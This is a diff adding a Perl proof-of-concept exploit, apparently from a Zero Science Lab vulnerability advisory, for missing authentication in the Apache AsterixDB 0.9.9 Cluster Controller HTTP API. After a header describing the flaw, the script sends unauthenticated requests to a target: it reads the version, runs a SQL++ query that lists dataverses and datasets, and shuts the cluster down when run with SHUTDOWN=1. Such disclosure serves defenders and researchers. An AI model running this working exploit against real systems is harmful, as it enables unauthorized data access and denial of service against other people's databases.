@@ -1,0 +1,67 @@
+#!/usr/bin/env perl
+#
+#
+# Apache AsterixDB 0.9.9 Missing Authentication
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://asterixdb.apache.org
+# Affected version: 0.9.9
+#
+# Summary: Apache AsterixDB is a highly scalable data management system that
+# can store, index, and manage semi-structured data, e.g., much like MongoDB,
+# but it also supports a full-power query language with the expressiveness of
+# SQL (and more). Unlike analytics engines like Apache Hive or Apache Spark,
+# it stores and manages data, so AsterixDB can exploit its knowledge of data
+# partitioning and the availability of indexes to avoid always scanning data
+# set(s) to process queries. Somewhat surprisingly, there is no open source
+# parallel database system (relational or otherwise) available to developers
+# today - AsterixDB aims to fill this need.
+#
+# Desc: Apache AsterixDB suffers from a missing authentication vulnerability
+# on its Cluster Controller HTTP API. Only the user-defined function endpoint
+# is wrapped with authentication, while the query service and the /admin/shutdown
+# endpoint are exposed with no authentication, so a remote attacker can execute
+# SQL++ queries and shut down the cluster with no credentials. This results in
+# unauthenticated data access and denial of service.
+#
+# Tested on:asterix-server-0.9.9
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6028
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6028
+#
+#
+# 13.08.2026
+#
+
+
+use strict;
+use warnings;
+use HTTP::Tiny;
+
+my $cc = $ARGV[0] // 'http://TARGET:19002';
+$cc =~ s{/+$}{};
+my $http = HTTP::Tiny->new(timeout => 10, agent => 'zeroscience/1.0');
+
+print "[1] GET /admin/version :\n";
+my $v = $http->get("$cc/admin/version");
+printf "    HTTP %s  %s\n", $v->{status}, ($v->{content} // '');
+
+print "[2] POST /query/service :\n";
+my $sql = 'SELECT dv.DataverseName, ds.DatasetName FROM Metadata.`Dataverse` dv '
+        . 'LEFT JOIN Metadata.`Dataset` ds ON ds.DataverseName = dv.DataverseName;';
+my $q = $http->post_form("$cc/query/service", { statement => $sql });
+printf "    HTTP %s\n    %s\n", $q->{status}, substr($q->{content} // '', 0, 800);
+
+if (($ENV{SHUTDOWN} // '0') eq '1') {
+    print "[3] POST /admin/shutdown :\n";
+    my $s = $http->post("$cc/admin/shutdown", { content => '' });
+    printf "    HTTP %s  %s\n", $s->{status}, ($s->{content} // '');
+} else {
+    print "[3] POST /admin/shutdown - skipped. Run with SHUTDOWN=1.\n";
+}
